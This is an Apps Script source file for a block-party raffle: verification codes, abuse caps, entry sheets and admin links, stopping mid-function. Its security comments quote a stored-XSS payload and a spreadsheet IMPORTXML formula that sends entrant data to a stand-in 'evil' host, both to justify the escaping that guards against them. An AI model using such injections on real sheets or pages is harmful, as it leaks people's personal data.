// RaffleCode.gs — TSG Block Party 2026 prize drawing (entry form + draw + FUB sync)
//
// Added 2026-09-16, per Durand. Lives in the "TSG Open House Sign-In + Client
// Intake Forms" project ON PURPOSE rather than in a new standalone project:
// this project is ALREADY the public, anonymous, no-login form host under
// info@, it already holds FUB_API_KEY, and it already carries the hardening a
// public endpoint needs (submit token, rate limit, honeypot, dedupe claims,
// contact-enumeration protection, error alerts). A greenfield project would
// have meant reimplementing all of that from scratch, untested, in three days
// — strictly more risk, not less. Nothing here touches the task-tracker script
// or its Anthropic key / script token.
//
// This file is ADDITIVE. It defines only raffle* symbols and reads a handful of
// existing helpers out of Code.gs's shared global scope (checkSubmitToken and
// checkRateLimit have already run in doPost before anything here is reached).
// The only edits to Code.gs are the two one-line route hooks in PATCH-Code.gs.md.
//
// Storage is a Google Sheet, not FUB: an entry is a contest record and has to
// survive a FUB outage, a bad API key, or a rate-limited CRM. The sheet row is
// written FIRST and the FUB push is best-effort on top of it, with its outcome
// recorded back on the row so raffleRetryFubFailures() can re-push later. An
// entrant is never turned away because the CRM was down.

// ---------- Event configuration ----------
var RAFFLE_EVENT_NAME   = 'TSG Block Party 2026';
var RAFFLE_TZ           = 'America/New_York';
// 2026-09-17, per Durand: the entry window is OPEN FROM NOW, not just during the
// party. The original design only accepted entries between 3:00 and 6:15 on the
// day, which made sense when entering was a 20-second sign-in at a table. It
// stopped making sense once a referral entered the picture: chasing somebody
// else's inbox is not a three-hour job, and a window that tight would have
// produced a 6:30 announcement with a near-empty pool. (A confirmed referral is
// now a multiplier rather than a requirement, so a third party's inbox is no
// longer on the critical path at all -- but the reasons to open early stand.)
//
// Opening it early is also what makes the pre-event email to invited clients
// work -- people arrive already entered, and referrals have days rather than
// hours to confirm.
//
// The CLOSE is still hard and still server-side: entries stop at 6:15 because
// that is when the winner is drawn. Anything else would mean drawing from a pool
// that is still changing.
var RAFFLE_OPEN_AT      = '2026-09-01T00:00:00-04:00';
// The party itself. Until 2026-09-17 every date on the page was derived from
// RAFFLE_OPEN_AT, which was fine while "entries open" and "the party starts"
// were the same instant. They are not any more, so the event has its own
// constant and the page reads the event date from here. Change the party date in
// ONE place and every line on the form follows.
var RAFFLE_EVENT_AT     = '2026-09-19T15:00:00-04:00';
var RAFFLE_EVENT_ENDS   = '7:00 PM';
var RAFFLE_VENUE        = '1342 N Hancock St, Philadelphia';
var RAFFLE_CLOSE_AT     = '2026-09-19T18:15:00-04:00';
var RAFFLE_DRAW_AT      = '2026-09-19T18:15:00-04:00';
var RAFFLE_ANNOUNCE_AT  = '6:30 PM';
var RAFFLE_PRIZE_SHORT  = '$300 toward any Ticketmaster purchase';
var RAFFLE_PRIZE_ARV    = '$300.00';

// Ryan's calendar identity is ryan@thestawaszgroup.com; this project's agent
// roster has him as ryan@tsg.homes. Both are mailed rather than guessing which
// one he actually reads on a Saturday evening — see README "Open items".
var RAFFLE_RESULT_EMAIL = 'durand@thestawaszgroup.com,ryan@thestawaszgroup.com,ryan@tsg.homes';

// ---------- Entry weighting ----------
// 2026-09-17, per Durand, BEFORE anybody had entered. Entry used to REQUIRE a
// confirmed referral, and that put a third party's inbox on the critical path of
// the raffle existing at all: a cold referral confirming by email inside a few
// days converts somewhere around 20-40% even with a nudge, so a handful of
// referrals could realistically produce ZERO eligible entries and no drawing.
// That failure mode is far worse than a thin pool.
//
// So a referral is now a MULTIPLIER, not a gate:
//   * verifying your email enters you once, immediately;
//   * every referral who confirms adds RAFFLE_BONUS_TICKETS_PER_REFERRAL more.
//
// Referring is still worth six times as much as not, so the incentive is intact,
// but the drawing cannot fail to have entrants. Changed while the rules bound
// nobody -- doing this after entries started would have meant judging people
// under different rules than they entered under.
var RAFFLE_BONUS_TICKETS_PER_REFERRAL = 5;

var RAFFLE_SOURCE = 'TSG Block Party 2026 - Raffle';
var RAFFLE_TAGS   = ['Block Party 2026', 'Block Party Raffle Entrant', 'Event Lead'];

// ---------- Test mode vs live ----------
// Reuses this project's EXISTING QA test mode (see the QA_TEST_* block in
// Code.gs) rather than inventing a second one: ?form=raffle&qatest=<QA_TEST_SECRET>
// mints a token, the page carries it, and doPost resolves isQaTestMode_() before
// either of the raffle hooks is reached. One test-mode concept for the whole
// project.
//
// Test entries live in their OWN sheet tab and a test draw records its winner
// under its OWN script property. That separation is structural, not a filter:
// there is no code path by which a test entry can be drawn as the real winner,
// and a test draw cannot consume the real draw's one-shot idempotency lock.
//
// !! ONE DELIBERATE DIFFERENCE FROM Code.gs's TEST MODE. That one is documented
// as "a LABELLING and ROUTING change only; by construction it cannot relax a
// check". The raffle's test mode DOES relax exactly one check: the entry window.
// It has to -- entries are refused outside 3:00-6:15 PM on 19 Sep, so with the
// window enforced there is no way to test the form before the party, which is
// the entire point. Every other check still runs unchanged: form token, rate
// limit, honeypot, required fields, consent, and one-entry-per-person. The
// relaxation is logged loudly every time it happens.
// ---------- Email verification ----------
// Entry is two-step: details -> emailed 6-digit code -> entered. Nothing is
// written to the sheet or to FUB until the code is confirmed, so a typo'd or
// invented address never becomes a contact record.
//
// WHY EMAIL AND NOT SMS. The phone is the field TCPA actually cares about, so an
// SMS code would be the stronger check. It is not reachable for this event:
// Follow Up Boss's /v1/textMessages endpoint only LOGS an externally-sent text,
// it cannot send one, and a real SMS provider needs US A2P 10DLC registration,
// which is currently running 10-15 days for campaign review. The party is in
// three days. The phone is therefore hard-validated (below) rather than
// ownership-proven, and that limitation is stated plainly in the README.
var RAFFLE_CODE_TTL_SECONDS = 900;      // 15 minutes to type a 6-digit code
var RAFFLE_CODE_MAX_ATTEMPTS = 5;
var RAFFLE_PENDING_PREFIX = 'raffle_pending_';
// A verified session: proof, on later requests, that this visitor owns the email
// address their entry will be attributed to. Written by raffleVerifyCode_ and
// read by raffleSubmitReferral_. One hour is long enough to think of someone to
// refer and type their details, and short enough that a phone left on a table at
// the party is not a standing credential.
var RAFFLE_VERIFIED_PREFIX = 'raffle_verified_';
var RAFFLE_VERIFIED_TTL_SECONDS = 3600;

// ---------- Verification-email abuse caps ----------
// Step 1 emails a code to whatever address is posted, before anything is
// verified. That is what verification IS, but it also makes this endpoint a
// free mailer that anyone with the QR code can drive from a script. Two things
// have to be bounded:
//
//   * one address being mailed over and over (harassment), and
//   * the account's daily send quota (1,500 on Workspace). The shared
//     checkRateLimit() caps 15 submissions/MINUTE across both public forms,
//     which sounds tight but sustains 21,600/day -- the quota dies in under two
//     hours, taking verification codes, the Open House form's emails and
//     sendErrorAlert down with it, silently.
//
// So: at most 3 codes to one address per hour, and a hard ceiling on total
// codes per rolling 6-hour window (CacheService's maximum TTL). The party is
// three hours with about 125 people expected, so the global ceiling is roughly
// 4x the realistic peak -- it only bites during an attack.
// Added 2026-09-16 after test/test_redteam.js (T3).
var RAFFLE_CODE_SEND_PREFIX = 'raffle_codes_';
var RAFFLE_CODE_MAX_PER_ADDRESS = 3;
var RAFFLE_CODE_ADDRESS_WINDOW_SECONDS = 3600;   // 1 hour
var RAFFLE_CODE_GLOBAL_PREFIX = 'raffle_codes_all_';
var RAFFLE_CODE_MAX_GLOBAL = 500;
var RAFFLE_CODE_GLOBAL_WINDOW_SECONDS = 21600;   // 6 hours (cache maximum)

// Junk rejection, applied to BOTH steps. This is not politeness -- FUB already
// carries "test@me.com / 1234567899" and "asdf@asdf.caf" from earlier form
// testing, and a raffle at a party is exactly where that gets typed on purpose.
var RAFFLE_DISPOSABLE_EMAIL_RE = new RegExp('@(?:' + [
  'mailinator\\.com', 'guerrillamail\\.[a-z]+', '10minutemail\\.[a-z]+',
  'tempmail\\.[a-z]+', 'temp-mail\\.[a-z]+', 'throwaway\\.[a-z]+',
  'yopmail\\.[a-z]+', 'trashmail\\.[a-z]+', 'sharklasers\\.com',
  'getnada\\.com', 'dispostable\\.com', 'maildrop\\.cc',
  'fakeinbox\\.com', 'mailnesia\\.com', 'example\\.(?:com|org|net)',
  'test\\.(?:com|org|net)'
].join('|') + ')$', 'i');
var RAFFLE_ROLE_LOCALPART_RE =
  /^(?:test|tester|testing|asdf|qwerty|admin|administrator|root|postmaster|abuse|noreply|no-reply|donotreply|nobody|none|null|na|n\/a|fake|foo|bar|baz|xxx|aaa|sample|example)[0-9]*$/i;

// Rejects a phone that cannot be a real North American number, plus the
// keyboard-mash patterns people actually type.
function raffleRejectJunkPhone_(phone) {
  var d = String(phone || '').replace(/\D/g, '');
  if (!d) throw makeValidationError('Enter your phone number.');
  if (d.length === 11 && d.charAt(0) === '1') d = d.slice(1);
  if (d.length !== 10) {
    throw makeValidationError('Enter a 10-digit US phone number.');
  }
  if (/^(\d)\1{9}$/.test(d)) {
    throw makeValidationError('That phone number does not look real. Please check it.');
  }
  if (d === '1234567890' || d === '0123456789' || d === '9876543210') {
    throw makeValidationError('That phone number does not look real. Please check it.');
  }
  var area = d.slice(0, 3), exch = d.slice(3, 6);
  // NANP: area and exchange codes never start 0 or 1, and N11 codes are service
  // codes (411, 911...), never subscriber numbers.
  if (area.charAt(0) === '0' || area.charAt(0) === '1' ||
      exch.charAt(0) === '0' || exch.charAt(0) === '1' ||
      /^\d11$/.test(area)) {
    throw makeValidationError('That is not a valid US phone number. Please check it.');
  }
  // 555-01xx is the reserved fictional range.
  if (exch === '555' && d.slice(6, 8) === '01') {
    throw makeValidationError('That phone number does not look real. Please check it.');
  }
  return d;
}

function raffleRejectJunkEmail_(email) {
  var e = String(email || '').trim().toLowerCase();
  // Code.gs's validateEmailField returns early on an empty value (it is used
  // where email is optional), so emptiness has to be caught here or a blank
  // address would sail through and we would "send a code" to nobody.
  if (!e) throw makeValidationError('Enter your email address.');
  validateEmailField(e);                       // shared shape check from Code.gs
  if (RAFFLE_DISPOSABLE_EMAIL_RE.test(e)) {
    throw makeValidationError('Please use a real email address you can check right now — we send your entry code to it.');
  }
  var local = e.split('@')[0];
  if (RAFFLE_ROLE_LOCALPART_RE.test(local)) {
    throw makeValidationError('Please use your own email address.');
  }
  return e;
}

var RAFFLE_LIVE_SHEET_NAME  = 'Entries';
var RAFFLE_TEST_SHEET_NAME  = 'Test Entries';
var RAFFLE_TEST_WINNER_PROP = 'RAFFLE_TEST_WINNER_JSON';

// Whoever runs setupRaffle() OWNS the entries sheet, and that is not
// necessarily the account the web app runs as (executeAs: USER_DEPLOYING means
// the deploying account). If those differ and the sheet is not shared, the web
// app's SpreadsheetApp.openById throws and EVERY ENTRY ON THE DAY IS REFUSED.
// So setup explicitly shares the sheet with both accounts rather than assuming
// the right person happened to run it.
var RAFFLE_SHEET_SHARE_WITH = ['info@tsg.homes', 'durand@thestawaszgroup.com'];

var RAFFLE_SHEET_PROP   = 'RAFFLE_SHEET_ID';
var RAFFLE_WINNER_PROP  = 'RAFFLE_WINNER_JSON';
var RAFFLE_ADMIN_PROP   = 'RAFFLE_ADMIN_KEY';
var RAFFLE_BACKUP_COUNT = 2;

// Consent language version stamped onto every row. Bump this string if the
// consent copy OR the Official Rules in RaffleForm.html change, so the audit
// trail stays honest about which wording a given entrant actually saw. The
// consent paragraph itself is unchanged in v3 -- rules sections 4, 5 and 7 are
// what moved, and the checkbox binds the entrant to those too.
var RAFFLE_CONSENT_VERSION = 'raffle-v3 (2026-09-17, 1 entry + bonus per confirmed referral)';

// 2026-09-17, per Durand: a row is written when the entrant submits a referral,
// but it is not worth its bonus yet -- 'Entry Status' is
// 'pending-consent' until the referred person clicks the link in their email and
// consents themselves. Only 'eligible' rows are drawn from.
//
// Columns are appended, never reordered or renamed: raffleEnsureHeaders_ widens
// an existing sheet in place, so the tab Durand already has keeps its rows.
var RAFFLE_SHEET_HEADERS = [
  'Timestamp (ET)', 'Full Name', 'Email', 'Phone',
  'Consent', 'Consent Version', 'Entry Source',
  'FUB Status', 'FUB Person ID', 'Eligible', 'Email Verified',
  // --- referral entry (added 2026-09-17) ---
  'Entry Status',        // pending-consent | eligible | superseded | declined
  'Referral Name', 'Referral Email', 'Referral Phone',
  'Referral Role',       // Buyer | Seller
  'Referral Timeframe',
  'Referral FUB ID',
  'Referral Consent At',
  'Referral Emailed At',
  'Consent Token',
  // --- added 2026-09-17 (deferred FUB creation + the referral chain) ---
  'Referral Logged At',   // when an unconsented referral was swept into FUB, flagged
  'Chain Token',          // lets a consented referral enter by referring, without re-verifying
  'Chain Emailed At',
  'Reminder Sent At'      // the one last-chance nudge before the draw
];

// Column indexes, by name, resolved once. Reading by index literal is what makes
// a schema change dangerous; this makes appending a column a one-line edit.
var RAFFLE_COL = (function () {
  var m = {};
  RAFFLE_SHEET_HEADERS.forEach(function (h, i) { m[h] = i; });
  return m;
})();

var RAFFLE_STATUS_PENDING    = 'pending-consent';
var RAFFLE_STATUS_ELIGIBLE   = 'eligible';
var RAFFLE_STATUS_SUPERSEDED = 'superseded';
var RAFFLE_STATUS_DECLINED   = 'declined';

// Widens an existing tab to the current header set, in place. Idempotent, and
// safe on the tab that already holds live rows: it only ever ADDS columns to the
// right of what is there, and only when the existing header row is a prefix of
// the current one. Anything else (a renamed or reordered column) is refused
// loudly rather than guessed at, because guessing would silently mis-map data.
function raffleEnsureHeaders_(sh) {
  var lastCol = sh.getLastColumn();
  if (lastCol >= RAFFLE_SHEET_HEADERS.length) return;
  if (lastCol > 0) {
    var existing = sh.getRange(1, 1, 1, lastCol).getValues()[0]
      .map(function (v) { return String(v || '').trim(); });
    for (var i = 0; i < existing.length; i++) {
      if (existing[i] && existing[i] !== RAFFLE_SHEET_HEADERS[i]) {
        throw new Error('Raffle sheet "' + sh.getName() + '" column ' + (i + 1) + ' is "' +
          existing[i] + '" but the code expects "' + RAFFLE_SHEET_HEADERS[i] + '". ' +
          'Refusing to migrate a sheet whose columns have been reordered or renamed.');
      }
    }
  }
  var missing = RAFFLE_SHEET_HEADERS.slice(lastCol);
  // A sheet narrower than the header list would make the setValues below throw.
  // The default grid is 26 columns and the schema is 25, so this is only reached
  // on a sheet somebody trimmed -- but a loud failure here would refuse an entry.
  var maxCols = sh.getMaxColumns();
  if (maxCols < RAFFLE_SHEET_HEADERS.length) {
    sh.insertColumnsAfter(maxCols, RAFFLE_SHEET_HEADERS.length - maxCols);
  }
  sh.getRange(1, lastCol + 1, 1, missing.length).setValues([missing])
    .setFontWeight('bold');
  sh.setFrozenRows(1);
  Logger.log('raffleEnsureHeaders_: added ' + missing.length + ' column(s) to "' +
    sh.getName() + '": ' + missing.join(', '));
}

// ---------- Small helpers ----------
function raffleNow_() { return new Date(); }

function raffleFmt_(d) {
  return Utilities.formatDate(d, RAFFLE_TZ, 'yyyy-MM-dd HH:mm:ss');
}

// ---------- Output encoding ----------
// The host project deliberately stopped HTML-escaping submissions at INGEST
// (Code.gs, audit fix M1: it was turning O'Brien into O&#39;Brien on the way
// into FUB) and its comment says the right place to escape is wherever a value
// is actually rendered as HTML. This module is the first caller that does:
// raffleStatusPage_ and raffleDrawPage_ build HTML by concatenation from an
// entrant's name, phone and email, all three of which came from a public text
// box on a page anyone who scans the QR code can reach.
//
// Unescaped, "<img src=x onerror=...> Smith" is a stored XSS that fires in
// Durand's browser the moment he opens the admin page to read the winner --
// i.e. at 6:15 in front of the crowd. Found by test/test_redteam.js (T1),
// 2026-09-16, before it ever ran live.
//
// Escape at the sink. Never re-add escaping at ingest: FUB, the Sheet and the
// plain-text emails all want the real characters.
function raffleEsc_(v) {
  return String(v === null || v === undefined ? '' : v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// ---------- Spreadsheet write safety ----------
// Sheets evaluates any cell whose text begins with = + - or @ as a FORMULA, so
// an entrant who types =IMPORTXML("https://evil/?d="&C2,"//a") into the name box
// gets that formula executed with Durand's session the moment he opens the
// entries sheet -- and IMPORTXML/IMPORTDATA/HYPERLINK can quietly ship every
// other entrant's name, email and phone to a third-party URL. The junk-phone
// filter does not catch it: that reads digits, and a formula string can carry
// ten perfectly valid ones.
//
// A leading apostrophe is Sheets' own "this is text" marker: it is not part of
// the value, it is not displayed, and getValue() returns the string without it,
// so dedupe keys and the FUB push are unaffected. Applied to every cell written
// from entrant input. Found by test/test_redteam.js (T2), 2026-09-16.
function raffleSafeCell_(v) {
  var s = String(v === null || v === undefined ? '' : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

// Normalized identity keys. One entry per person is enforced on BOTH, because
// the same person entering twice will usually vary one and not the other
// (a nickname in the name field, gmail vs work email, phone typed two ways).
// One entry per PERSON, and a person has one inbox even when they have many
// spellings of it. gmail ignores dots entirely and every provider below ignores
// a +tag suffix, so sam.vance@gmail.com, samvance@gmail.com and
// sam.vance+party@gmail.com are one mailbox and must be one entry -- otherwise
// the cheapest possible stuffing attack needs no second inbox and no second
// phone. Dots are collapsed ONLY for Google-hosted consumer mail, because other
// hosts do treat a dot as a distinct address.
//
// This is a KEY function only. The address actually mailed is always the one
// the entrant typed.
//
// RESIDUAL GAP, accepted knowingly: Google Workspace and other custom domains
// also honour +tags, and they cannot be enumerated here. The domain list is
// deliberately conservative -- collapsing +tags everywhere would merge two
// genuinely distinct people on the rare host that treats + as a literal
// character, and would also break this project's own QA addresses
// (durand+raffleqa...@thestawaszgroup.com), which depend on staying distinct.
//
// What actually bounds stuffing is not this function: every entry has to
// RECEIVE a 6-digit code, so each extra entry costs a working inbox, and
// raffleCheckCodeSendQuota_ caps how many codes any one address can pull. This
// just removes the free case where one inbox yields unlimited spellings.
var RAFFLE_PLUS_ALIAS_DOMAINS = ['gmail.com', 'googlemail.com', 'outlook.com',
  'hotmail.com', 'live.com', 'yahoo.com', 'icloud.com', 'me.com', 'proton.me',
  'protonmail.com', 'fastmail.com'];
var RAFFLE_DOT_ALIAS_DOMAINS = ['gmail.com', 'googlemail.com'];

function raffleEmailKey_(email) {
  var v = String(email || '').trim().toLowerCase();
  var at = v.lastIndexOf('@');
  if (at < 1) return v;
  var local = v.slice(0, at), domain = v.slice(at + 1);
  if (domain === 'googlemail.com') domain = 'gmail.com';
  if (RAFFLE_PLUS_ALIAS_DOMAINS.indexOf(domain) !== -1) {
    var plus = local.indexOf('+');
    if (plus > 0) local = local.slice(0, plus);
  }
  if (RAFFLE_DOT_ALIAS_DOMAINS.indexOf(domain) !== -1) {
    local = local.replace(/\./g, '');
  }
  return local + '@' + domain;
}

function rafflePhoneKey_(phone) {
  var digits = String(phone || '').replace(/\D/g, '');
  // Strip a leading US country code so 2155551212 and 12155551212 collide.
  if (digits.length === 11 && digits.charAt(0) === '1') digits = digits.slice(1);
  return digits;
}

// The live tab and the test tab are different sheets in the same spreadsheet,
// so Durand can see both side by side. The test tab is created on first use, so
// an existing setup does not need setupRaffle() re-run to gain one.
function raffleSheet_(test) {
  var id = PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP);
  if (!id) throw new Error(RAFFLE_SHEET_PROP + ' is not set. Run setupRaffle() once from the editor.');
  var ss = SpreadsheetApp.openById(id);
  if (!test) {
    var live = ss.getSheetByName(RAFFLE_LIVE_SHEET_NAME) || ss.getSheets()[0];
    raffleEnsureHeaders_(live);
    return live;
  }
  var sh = ss.getSheetByName(RAFFLE_TEST_SHEET_NAME);
  if (!sh) {
    sh = ss.insertSheet(RAFFLE_TEST_SHEET_NAME);
    sh.appendRow(RAFFLE_SHEET_HEADERS);
    sh.setFrozenRows(1);
    sh.getRange(1, 1, 1, RAFFLE_SHEET_HEADERS.length).setFontWeight('bold').setBackground('#fde2e1');
  }
  raffleEnsureHeaders_(sh);
  return sh;
}

function raffleWinnerProp_(test) {
  return test ? RAFFLE_TEST_WINNER_PROP : RAFFLE_WINNER_PROP;
}

// ---------- One-time setup ----------
// Run this ONCE from the Apps Script editor (Durand, as info@). It is
// idempotent: re-running reuses the existing sheet and re-points the trigger
// rather than creating duplicates.
function setupRaffle() {
  var props = PropertiesService.getScriptProperties();
  var out = [];

  var sheetId = props.getProperty(RAFFLE_SHEET_PROP);
  if (!sheetId) {
    var ss = SpreadsheetApp.create('TSG Block Party 2026 — Raffle Entries');
    var sh = ss.getSheets()[0];
    sh.setName('Entries');
    sh.appendRow(RAFFLE_SHEET_HEADERS);
    sh.setFrozenRows(1);
    sh.getRange(1, 1, 1, RAFFLE_SHEET_HEADERS.length).setFontWeight('bold');
    props.setProperty(RAFFLE_SHEET_PROP, ss.getId());
    sheetId = ss.getId();
    out.push('Created entries sheet: ' + ss.getUrl());
  } else {
    out.push('Entries sheet already exists: https://docs.google.com/spreadsheets/d/' + sheetId);
  }

  // Bring the schema up to date HERE, not on the first visitor's request.
  // raffleSheet_ calls raffleEnsureHeaders_ on every access, so an old sheet
  // would migrate itself the moment somebody entered -- but that leaves the tab
  // looking like it is missing the referral columns until then, and it puts a
  // schema change on the critical path of a real entry. setupRaffle is the
  // function whose job is to leave this ready, so it should do it and report it.
  try {
    // The width has to be read WITHOUT raffleSheet_, which migrates on the way
    // out: measuring through it reported "up to date" in the very call that
    // added fourteen columns, because the widening had already happened by the
    // time getLastColumn was asked. (Shipped 2026-09-17, caught the same hour
    // by Durand's run: the log showed the columns being added and the summary
    // said nothing had changed.)
    var ssSchema = SpreadsheetApp.openById(sheetId);
    var liveTab = ssSchema.getSheetByName(RAFFLE_LIVE_SHEET_NAME) || ssSchema.getSheets()[0];
    var beforeCols = liveTab.getLastColumn();
    raffleSheet_(false);
    raffleSheet_(true);                                  // creates + migrates the test tab too
    var afterCols = liveTab.getLastColumn();
    out.push(afterCols > beforeCols
      ? 'Schema migrated: ' + beforeCols + ' -> ' + afterCols + ' columns on both tabs.'
      : 'Schema up to date (' + afterCols + ' columns).');
  } catch (schemaErr) {
    out.push('WARNING: could not bring the entries sheet schema up to date: ' + schemaErr +
             '  <-- fix this before Saturday, or entries may be refused');
  }

  // Share it, every run, whether the sheet is new or not -- this is also the
  // repair path if setup was first run by the wrong account.
  try {
    var ssShare = SpreadsheetApp.openById(sheetId);
    var owner = '';
    try { owner = (ssShare.getOwner() && ssShare.getOwner().getEmail()) || ''; } catch (ownErr) { owner = ''; }
    out.push('Entries sheet owner: ' + (owner || '(unknown)'));
    RAFFLE_SHEET_SHARE_WITH.forEach(function (who) {
      if (owner && who.toLowerCase() === owner.toLowerCase()) return;   // owner already has it
      try {
        ssShare.addEditor(who);
        out.push('  shared with ' + who);
      } catch (shareErr) {
        out.push('  COULD NOT share with ' + who + ': ' + shareErr +
                 '  <-- fix by hand, or entries may be refused on the day');
      }
    });
  } catch (openErr) {
    out.push('WARNING: could not open the entries sheet to share it: ' + openErr);
  }

  if (!props.getProperty(RAFFLE_ADMIN_PROP)) {
    props.setProperty(RAFFLE_ADMIN_PROP,
      Utilities.getUuid().replace(/-/g, '') + Utilities.getUuid().replace(/-/g, ''));
    out.push('Generated RAFFLE_ADMIN_KEY (see Project Settings > Script Properties).');
  } else {
    out.push('RAFFLE_ADMIN_KEY already set.');
  }

  // Drop any previously installed draw trigger before adding this one, so
  // re-running setup can never arm two draws.
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (t.getHandlerFunction() === 'raffleScheduledDraw') ScriptApp.deleteTrigger(t);
  });
  var drawAt = new Date(RAFFLE_DRAW_AT);
  if (drawAt.getTime() > Date.now()) {
    ScriptApp.newTrigger('raffleScheduledDraw').timeBased().at(drawAt).create();
    out.push('Draw trigger armed for ' + raffleFmt_(drawAt) + ' ET.');
    var runner = '';
    try { runner = Session.getEffectiveUser().getEmail(); } catch (whoErr) { runner = '(unknown)'; }
    out.push('Trigger will run as: ' + runner + '  (whoever ran setupRaffle owns it, ' +
             'so the 6:15 result email comes from this account)');
  } else {
    out.push('WARNING: RAFFLE_DRAW_AT is in the past; no trigger armed. Draw manually.');
  }

  // Hourly digest during the party (raffleEventDigest no-ops outside the window,
  // so an hourly trigger is safe to leave armed and cheap to reason about -- an
  // every-hour trigger that decides for itself beats six one-shot triggers that
  // have to be individually cleaned up).
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (t.getHandlerFunction() === 'raffleEventDigest') ScriptApp.deleteTrigger(t);
  });
  ScriptApp.newTrigger('raffleEventDigest').timeBased().everyHours(1).create();
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (t.getHandlerFunction() === 'raffleConsentReminderSweep') ScriptApp.deleteTrigger(t);
  });
  // The batch itself: one shot, at one moment, so every reminder goes together.
  var remindAt = new Date(RAFFLE_REMINDER_AT);
  if (remindAt.getTime() > Date.now()) {
    ScriptApp.newTrigger('raffleConsentReminderSweep').timeBased().at(remindAt).create();
    out.push('Reminder batch armed for ' + raffleFmt_(remindAt) + ' ET — one send, all at once.');
  } else {
    out.push('NOTE: RAFFLE_REMINDER_AT is in the past; no batch trigger armed.');
  }
  // Hourly catch-up. It does nothing once the batch marker is set, so it cannot
  // stagger the send -- it exists because a one-shot trigger that fails to fire
  // fails silently, and nobody would notice until the draw.
  ScriptApp.newTrigger('raffleConsentReminderSweep').timeBased().everyHours(1).create();
  out.push('Hourly catch-up armed in case the batch trigger misfires.');
  out.push('Hourly entry digest armed (silent outside 3:00-6:15 PM on the day).');
  out.push('Before the party you get an email every ' + RAFFLE_MILESTONE_EVERY +
           ' people entered instead.');

  var msg = out.join('\n');
  Logger.log(msg);
  return msg;
}

// Prints every URL you need, COMPLETE -- no placeholders to fill in by hand.
// Run it from the editor and copy the output. The status/draw links carry the
// admin key and the test link carries the QA secret, so treat the output like a
// password: do not paste it into a doc or a chat.
function raffleAdminLinks() {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty(RAFFLE_ADMIN_PROP);
  if (!key) throw new Error('Run setupRaffle() first.');
  var base = ScriptApp.getService().getUrl();
  var sheetId = props.getProperty(RAFFLE_SHEET_PROP);

  var out = [
    'PUBLIC — this is the QR / the link you share. No key, safe to print:',
    '  ' + base + '?form=raffle',
    '',
    'KIOSK — for the iPad at the table, auto-resets after each entry:',
    '  ' + base + '?form=raffle&kiosk=1',
    '',
    'LIVE ENTRY COUNT (private):',
    '  ' + base + '?form=raffle&action=status&key=' + key,
    '',
    'MANUAL DRAW — backup if the 6:15 trigger misfires (private):',
    '  ' + base + '?form=raffle&action=draw&key=' + key,
    '',
    '  Before 6:15 this link refuses and tells you so. The draw cannot be undone,',
    '  so drawing early has to be asked for twice — add &force=1 only if you really',
    '  mean to close entries now:',
    '  ' + base + '?form=raffle&action=draw&key=' + key + '&force=1',
    ''
  ];

  // The QA secret is a separate property, shared with the other two forms. If it
  // is missing the test URLs cannot work, so say that outright rather than
  // printing a link with a placeholder in it that looks like it should work.
  var qa = props.getProperty(QA_TEST_SECRET_PROPERTY);
  out.push('--- TEST MODE ---');
  if (qa) {
    out.push('TEST FORM — works any day, writes to the "' + RAFFLE_TEST_SHEET_NAME + '" tab:',
             '  ' + base + '?form=raffle&qatest=' + qa,
             '',
             'TEST ENTRY COUNT:',
             '  ' + base + '?form=raffle&action=status&key=' + key + '&test=1',
             '',
             'TEST DRAW — rehearses the real thing, emails ' + QA_TEST_NOTIFY_EMAIL + ' only:',
             '  ' + base + '?form=raffle&action=draw&key=' + key + '&test=1',
             '',
             'Run raffleResetTest() to wipe test data and rehearse again.');
  } else {
    out.push('NOT AVAILABLE: the "' + QA_TEST_SECRET_PROPERTY + '" script property is not set,',
             'so ?qatest= does nothing and every test URL would just serve the live page.',
             'Set it in Project Settings > Script Properties (any hard-to-guess string),',
             'then re-run raffleAdminLinks(). The other two public forms use this same',
             'property, so if they have test mode working it is already set.');
  }

  out.push('DRAW CONSOLE — this is the one to use at the party:',
           '  ' + base + '?form=raffle&action=console&key=' + key,
           '',
           '  All three picks with FUB links (theirs and their referral\'s), pick one,',
           '  preview the exact email, confirm, send. Emergency redraw is on the same page.',
           '  The 6:15 result email links straight here. Test version: &test=1.',
           '',
           'EMAIL THE WINNER DIRECTLY (skips the console; sends to pick 1):',
           '  ' + base + '?form=raffle&action=notifywinner&key=' + key,
           '',
           '  Deliberately not automatic. The draw runs at 6:15 and you announce at ' +
           RAFFLE_ANNOUNCE_AT + ', so an',
           '  automatic email would reach the winner before you say their name. It sends once;',
           '  you and Ryan are copied and replies go to ' + RAFFLE_WINNER_REPLY_TO + '.',
           '');

  if (sheetId) {
    out.push('', 'ENTRIES SHEET:',
             '  https://docs.google.com/spreadsheets/d/' + sheetId + '/edit');
  }

  var msg = out.join('\n');
  Logger.log(msg);
  return msg;
}

// ---------- doGet branch (reached from Code.gs's one-line hook) ----------
function raffleServeForm_(e, baseUrl, chain) {
  var action = (e.parameter.action || '').toString().toLowerCase();
  // ?qatest=<QA_TEST_SECRET> mints the token AND flips this execution into test
  // mode. A wrong or absent value returns '' and renders the ordinary live page,
  // so nothing about the response reveals whether the secret was close.
  var qaTestToken = issueQaTestToken_(e);
  var isTest = !!qaTestToken;

  // The link in the referral's email. No key: the token in ?t= is the credential,
  // and it only ever unlocks that one person's own record.
  if (action === RAFFLE_CONSENT_ACTION) return raffleConsentPage_(e);
  // The chain invite's link: a confirmed referral entering by referring someone.
  if (action === RAFFLE_CHAIN_ACTION) return raffleChainStart_(e);

  // Every admin action goes through ONE gate. Adding a branch inside this block
  // without adding its name here is a silent dead end: the action falls through
  // and serves the public entry form instead, which is exactly what happened to
  // 'console' and 'notifywinner' until test_raffle.js caught it (2026-09-17).
  var RAFFLE_ADMIN_ACTIONS = ['status', 'draw', 'console', 'notifywinner'];
  if (RAFFLE_ADMIN_ACTIONS.indexOf(action) !== -1) {
    var key = PropertiesService.getScriptProperties().getProperty(RAFFLE_ADMIN_PROP);
    // Constant-ish comparison and an identical response for a wrong key as for
    // no key, so this can't be probed.
    if (!key || (e.parameter.key || '').toString() !== key) {
      return HtmlService.createHtmlOutput('<p style="font-family:sans-serif">Not found.</p>');
    }
